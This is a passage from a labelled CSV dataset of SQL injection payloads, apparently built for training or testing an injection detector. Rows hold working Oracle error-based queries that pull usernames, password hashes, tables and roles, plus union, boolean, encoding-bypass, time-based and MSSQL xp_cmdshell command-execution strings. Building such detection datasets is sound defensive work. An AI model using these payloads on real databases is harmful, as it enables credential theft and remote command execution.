row_index,payload_norm,label,sqli_type_hint
41370,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",1,
41371,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",1,
41372,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",1,
41373,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",1,
41374,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",1,
41375,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",1,
41376,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",1,
41377,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",1,
41378,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",1,
41379,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",1,
41380,"1,2,3--",1,union_versioned_comment
41381,"NULL,NULL--",1,union_versioned_comment
41382,1 SELECT*/NULL--,1,union_versioned_comment
41383,"1+ + +NULL,NULL--",1,union_versioned_comment
41384,"1 UNION SELECT 1,2,3--",1,union_comment_bypass
41385,"' UNION SELECT 0x61646d696e,0x61646d696e--",1,union_hex
41386,1 AND 0x61=0x61,1,boolean_hex
41387,' OR 0x313d31--,1,boolean_hex
41388,CHAR(39)||'OR'||CHAR(39)||'1'||CHAR(61)||CHAR(39)||'1',1,char_encoding
41389,"' UNION SELECT CHAR(65,68,77,73,78),NULL--",1,union_char
41390,'; EXEC xp_cmdshell('whoami')--,1,mssql_rce
41391,1; WAITFOR DELAY '0:0:5'--,1,mssql_timebased
41392,'; WAITFOR DELAY '00:00:05'--,1,mssql_timebased
41393,"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",1,mssql_error
41394,'; DECLARE @q NVARCHAR(4000);SET @q=0x73656c656374;EXEC(@q)--,1,mssql_dynamic
41395,1;SELECT TOP 1 table_name FROM information_schema.tables--,1,mssql_enum
41396,"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",1,mssql_union
41397,' UNION SELECT NULL FROM dual--,1,oracle_union
41398,' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--,1,oracle_oob
41399,1 AND ROWNUM=1 AND 1=1--,1,oracle_boolean
